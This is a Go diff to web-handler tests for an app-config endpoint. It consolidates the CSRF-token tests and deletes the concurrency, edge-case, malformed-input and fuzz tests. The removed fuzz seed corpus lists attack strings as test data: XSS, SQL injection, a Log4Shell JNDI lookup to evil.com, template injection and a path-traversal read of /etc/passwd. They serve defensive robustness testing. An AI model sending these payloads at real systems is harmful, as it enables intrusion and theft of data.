@@ -11,10 +11,8 @@ import (
 	"net/http/httptest"
 	"slices"
 	"strings"
-	"sync"
 	"testing"
 	"time"
-	"unicode/utf8"
 
 	"github.com/gorilla/sessions"
 	"github.com/labstack/echo/v4"
@@ -439,22 +437,6 @@ func TestGetAppConfig_ResponseFormat(t *testing.T) {
 	assert.Contains(t, authConfig, "enabledProviders", "authConfig should have enabledProviders field")
 }
 
-// TestGetAppConfig_ContentTypeHeader verifies correct content-type header.
-func TestGetAppConfig_ContentTypeHeader(t *testing.T) {
-	e, controller := setupAppConfigTest(t, nil)
-
-	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
-	rec := httptest.NewRecorder()
-	c := e.NewContext(req, rec)
-	c.SetPath("/api/v2/app/config")
-
-	err := controller.GetAppConfig(c)
-	require.NoError(t, err)
-
-	contentType := rec.Header().Get("Content-Type")
-	assert.Contains(t, contentType, "application/json", "Content-Type should be JSON")
-}
-
 // =============================================================================
 // Security Tests
 // =============================================================================
@@ -498,29 +480,38 @@ func TestGetAppConfig_NoSensitiveDataExposed(t *testing.T) {
 	assert.NotContains(t, body, "Password", "Password field should not exist")
 }
 
-// TestGetAppConfig_InvalidCSRFTokenType tests behavior with non-string CSRF token.
-// EnsureCSRFToken should generate a new token when the context value is invalid.
-func TestGetAppConfig_InvalidCSRFTokenType(t *testing.T) {
-	e, controller := setupAppConfigTest(t, nil)
+// TestGetAppConfig_UnusableCSRFContextValueGetsNewToken tests that a CSRF
+// context value that cannot be used as a token (a non-string, or an empty
+// string) is replaced by a freshly generated token instead of being served.
+func TestGetAppConfig_UnusableCSRFContextValueGetsNewToken(t *testing.T) {
+	tests := []struct {
+		name  string
+		value any
+	}{
+		{name: "non-string value", value: 12345},
+		{name: "empty string", value: ""},
+	}
 
-	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
-	rec := httptest.NewRecorder()
-	c := e.NewContext(req, rec)
-	c.SetPath("/api/v2/app/config")
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			e, controller := setupAppConfigTest(t, nil)
 
-	// Set invalid type for csrf - should not panic, will generate new token
-	c.Set("csrf", 12345) // int instead of string
+			req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
+			rec := httptest.NewRecorder()
+			c := e.NewContext(req, rec)
+			c.SetPath("/api/v2/app/config")
+			c.Set("csrf", tt.value)
 
-	err := controller.GetAppConfig(c)
-	require.NoError(t, err, "Should not error with invalid CSRF token type")
-	assert.Equal(t, http.StatusOK, rec.Code)
+			require.NoError(t, controller.GetAppConfig(c))
+			assert.Equal(t, http.StatusOK, rec.Code)
 
-	var response AppConfigResponse
-	err = json.Unmarshal(rec.Body.Bytes(), &response)
-	require.NoError(t, err)
+			var response AppConfigResponse
+			require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &response))
 
-	// EnsureCSRFToken generates a new token when context value is invalid type
-	assert.NotEmpty(t, response.CSRFToken, "New token should be generated when context has invalid type")
+			assert.NotEmpty(t, response.CSRFToken, "a new token should be generated")
+			assert.NotEqual(t, tt.value, response.CSRFToken, "the unusable context value must not be served")
+		})
+	}
 }
 
 // TestGetAppConfig_NilAuthService tests behavior when auth service is nil.
@@ -555,112 +546,6 @@ func TestGetAppConfig_NilAuthService(t *testing.T) {
 }
 
 // =============================================================================
-// Concurrency Tests
-// =============================================================================
-
-// TestGetAppConfig_Concurrent tests concurrent access to the endpoint.
-func TestGetAppConfig_Concurrent(t *testing.T) {
-	e, controller := setupAppConfigTest(t, nil)
-
-	const numRequests = 100
-	var wg sync.WaitGroup
-	errChan := make(chan error, numRequests)
-
-	for range numRequests {
-		wg.Go(func() {
-			req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
-			rec := httptest.NewRecorder()
-			c := e.NewContext(req, rec)
-			c.SetPath("/api/v2/app/config")
-
-			if err := controller.GetAppConfig(c); err != nil {
-				errChan <- err
-				return
-			}
-
-			if rec.Code != http.StatusOK {
-				errChan <- echo.NewHTTPError(rec.Code, "unexpected status")
-			}
-		})
-	}
-
-	wg.Wait()
-	close(errChan)
-
-	for err := range errChan {
-		t.Errorf("Concurrent request failed: %v", err)
-	}
-}
-
-// =============================================================================
-// Edge Case Tests
-// =============================================================================
-
-// TestGetAppConfig_EmptyVersion tests with empty version string.
-func TestGetAppConfig_EmptyVersion(t *testing.T) {
-	e := echo.New()
-	settings := &conf.Settings{
-		Version: "", // Empty version
-	}
-
-	controller := newAppHandler(t, e, settings)
-
-	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
-	rec := httptest.NewRecorder()
-	c := e.NewContext(req, rec)
-	c.SetPath("/api/v2/app/config")
-
-	err := controller.GetAppConfig(c)
-	require.NoError(t, err)
-	assert.Equal(t, http.StatusOK, rec.Code)
-
-	var response AppConfigResponse
-	err = json.Unmarshal(rec.Body.Bytes(), &response)
-	require.NoError(t, err)
-
-	assert.Empty(t, response.Version, "Empty version should be returned as-is")
-}
-
-// TestGetAppConfig_VersionWithSpecialChars tests version string with special characters.
-func TestGetAppConfig_VersionWithSpecialChars(t *testing.T) {
-	testVersions := []string{
-		"1.0.0-beta+build.123",
-		"v2.3.4-rc.1",
-		"0.0.1-SNAPSHOT",
-		"1.0.0-alpha.1+001",
-		"Development Build (local)",
-		"1.0.0 <script>alert('xss')</script>", // XSS attempt - should be JSON encoded
-	}
-
-	for _, version := range testVersions {
-		t.Run(version, func(t *testing.T) {
-			e := echo.New()
-			settings := &conf.Settings{
-				Version: version,
-			}
-
-			controller := newAppHandler(t, e, settings)
-
-			req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
-			rec := httptest.NewRecorder()
-			c := e.NewContext(req, rec)
-			c.SetPath("/api/v2/app/config")
-
-			err := controller.GetAppConfig(c)
-			require.NoError(t, err)
-			assert.Equal(t, http.StatusOK, rec.Code)
-
-			var response AppConfigResponse
-			err = json.Unmarshal(rec.Body.Bytes(), &response)
-			require.NoError(t, err, "Response should be valid JSON regardless of version content")
-
-			// Version should match exactly (JSON encoding handles any special chars)
-			assert.Equal(t, version, response.Version)
-		})
-	}
-}
-
-// =============================================================================
 // determineAccessAllowed Tests
 // =============================================================================
 
@@ -691,84 +576,6 @@ func TestDetermineAccessAllowed_SecurityEnabledNoAuthService(t *testing.T) {
 
 	allowed := controller.determineAccessAllowed(c, true)
 	assert.False(t, allowed, "Should deny access when auth service is nil (fail closed)")
-}
-
-// =============================================================================
-// Malformed Request Tests
-// =============================================================================
-
-// TestGetAppConfig_MalformedContextValues tests handling of malformed context values.
-func TestGetAppConfig_MalformedContextValues(t *testing.T) {
-	e, controller := setupAppConfigTest(t, nil)
-
-	testCases := []struct {
-		name  string
-		key   string
-		value any
-	}{
-		{"Nil csrf", "csrf", nil},
-		{"Int csrf", "csrf", 12345},
-		{"Float csrf", "csrf", 3.14159},
-		{"Bool csrf", "csrf", true},
-		{"Slice csrf", "csrf", []string{"a", "b"}},
-		{"Map csrf", "csrf", map[string]string{"key": "value"}},
-		{"Struct csrf", "csrf", struct{ X int }{42}},
-		{"Empty string csrf", "csrf", ""},
-		{"Whitespace csrf", "csrf", "   \t\n   "},
-		{"Very long csrf", "csrf", string(make([]byte, 100000))},
-		{"Null byte csrf", "csrf", "token\x00with\x00nulls"},
-		{"Unicode csrf", "csrf", "日本語トークン"},
-	}
-
-	for _, tc := range testCases {
-		t.Run(tc.name, func(t *testing.T) {
-			req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
-			rec := httptest.NewRecorder()
-			c := e.NewContext(req, rec)
-			c.SetPath("/api/v2/app/config")
-			c.Set(tc.key, tc.value)
-
-			// Should not panic
-			err := controller.GetAppConfig(c)
-			require.NoError(t, err, "Should handle malformed context value: %s", tc.name)
-			assert.Equal(t, http.StatusOK, rec.Code)
-
-			var response AppConfigResponse
-			err = json.Unmarshal(rec.Body.Bytes(), &response)
-			require.NoError(t, err, "Response should be valid JSON")
-		})
-	}
-}
-
-// TestGetAppConfig_ResponseConsistency tests that responses are consistent.
-func TestGetAppConfig_ResponseConsistency(t *testing.T) {
-	e, controller := setupAppConfigTest(t, nil)
-
-	const iterations = 10
-	responses := make([]AppConfigResponse, 0, iterations)
-
-	for range iterations {
-		req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
-		rec := httptest.NewRecorder()
-		c := e.NewContext(req, rec)
-		c.SetPath("/api/v2/app/config")
-		c.Set("csrf", "consistent-token")
-
-		err := controller.GetAppConfig(c)
-		require.NoError(t, err)
-		assert.Equal(t, http.StatusOK, rec.Code)
-
-		var response AppConfigResponse
-		err = json.Unmarshal(rec.Body.Bytes(), &response)
-		require.NoError(t, err)
-
-		responses = append(responses, response)
-	}
-
-	// All responses should be identical
-	for i := 1; i < len(responses); i++ {
-		assert.Equal(t, responses[0], responses[i], "Response %d should match response 0", i)
-	}
 }
 
 // TestGetAppConfig_NoExtraFields tests that no unexpected fields are returned.
@@ -866,126 +673,6 @@ func TestGetAppConfig_NoExtraFields(t *testing.T) {
 // =============================================================================
 // FUZZ TESTS
 // =============================================================================
-
-// FuzzGetAppConfig_CSRFToken fuzzes the CSRF token handling.
-// Run with: go test -fuzz=FuzzGetAppConfig_CSRFToken -fuzztime=30s
-func FuzzGetAppConfig_CSRFToken(f *testing.F) {
-	// Add seed corpus
-	f.Add("normal-token-123")
-	f.Add("")
-	f.Add("a")
-	f.Add(string(make([]byte, 1000)))
-	f.Add("token\x00with\x00nulls")
-	f.Add("日本語トークン")
-	f.Add("<script>alert('xss')</script>")
-	f.Add("' OR '1'='1")
-	f.Add("${jndi:ldap://evil.com/}")
-	f.Add("{{7*7}}")
-	f.Add("../../../etc/passwd")
-
-	f.Fuzz(func(t *testing.T, csrfToken string) {
-		e := echo.New()
-		mockDS := mocks.NewMockInterface(t)
-		mockDS.EXPECT().PruneAppEvents(mock.Anything, mock.Anything).Return(int64(0), nil).Maybe()
-		settings := &conf.Settings{
-			Version: "1.0.0-fuzz",
-		}
-
-		controller := &Handler{Core: &apicore.Core{DS: mockDS}, authService: nil}
-		controller.Settings.Store(settings)
-		apitest.PublishTestSettings(t, settings)
-
-		req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
-		rec := httptest.NewRecorder()
-		c := e.NewContext(req, rec)
-		c.SetPath("/api/v2/app/config")
-		c.Set("csrf", csrfToken)
-
-		err := controller.GetAppConfig(c)
-		if err != nil {
-			t.Errorf("Unexpected error: %v", err)
-		}
-
-		if rec.Code != http.StatusOK {
-			t.Errorf("Expected status 200, got %d", rec.Code)
-		}
-
-		var response AppConfigResponse
-		if jsonErr := json.Unmarshal(rec.Body.Bytes(), &response); jsonErr != nil {
-			t.Errorf("Response is not valid JSON: %v", jsonErr)
-		}
-
-		// For valid non-empty UTF-8 tokens, verify they are returned unchanged.
-		// Empty tokens trigger EnsureCSRFToken to generate a new one.
-		// Invalid UTF-8 sequences may be transformed by JSON encoding.
-		if utf8.ValidString(csrfToken) && csrfToken != "" {
-			if response.CSRFToken != csrfToken {
-				t.Errorf("CSRF token mismatch for valid UTF-8: expected %q, got %q", csrfToken, response.CSRFToken)
-			}
-		} else if csrfToken == "" {
-			// Empty input triggers token generation
-			if response.CSRFToken == "" {
-				t.Errorf("Expected generated token for empty input, got empty")
-			}
-		}
-		// For invalid UTF-8, just ensure we get a non-empty response
-		// (JSON encoding may replace invalid bytes with replacement characters)
-	})
-}
-
-// FuzzGetAppConfig_Version fuzzes the version field handling.
-// Run with: go test -fuzz=FuzzGetAppConfig_Version -fuzztime=30s
-func FuzzGetAppConfig_Version(f *testing.F) {
-	// Add seed corpus
-	f.Add("1.0.0")
-	f.Add("")
-	f.Add("v2.3.4-rc.1+build.123")
-	f.Add("Development Build (local)")
-	f.Add("<script>alert('xss')</script>")
-	f.Add(string(make([]byte, 10000)))
-	f.Add("日本語バージョン")
-	f.Add("version\x00with\x00nulls")
-
-	f.Fuzz(func(t *testing.T, version string) {
-		e := echo.New()
-		mockDS := mocks.NewMockInterface(t)
-		mockDS.EXPECT().PruneAppEvents(mock.Anything, mock.Anything).Return(int64(0), nil).Maybe()
-		settings := &conf.Settings{
-			Version: version,
-		}
-
-		controller := &Handler{Core: &apicore.Core{DS: mockDS}, authService: nil}
-		controller.Settings.Store(settings)
-		apitest.PublishTestSettings(t, settings)
-
-		req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
-		rec := httptest.NewRecorder()
-		c := e.NewContext(req, rec)
-		c.SetPath("/api/v2/app/config")
-
-		err := controller.GetAppConfig(c)
-		if err != nil {
-			t.Errorf("Unexpected error: %v", err)
-		}
-
-		if rec.Code != http.StatusOK {
-			t.Errorf("Expected status 200, got %d", rec.Code)
-		}
-
-		var response AppConfigResponse
-		if jsonErr := json.Unmarshal(rec.Body.Bytes(), &response); jsonErr != nil {
-			t.Errorf("Response is not valid JSON: %v", jsonErr)
-		}
-
-		// For valid UTF-8 versions, verify they are returned unchanged.
-		// Invalid UTF-8 sequences may be transformed by JSON encoding.
-		if utf8.ValidString(version) {
-			if response.Version != version {
-				t.Errorf("Version mismatch for valid UTF-8: expected %q, got %q", version, response.Version)
-			}
-		}
-	})
-}
 
 // fuzzSecurityInput holds the fuzz test input parameters for security config testing.
 type fuzzSecurityInput struct {
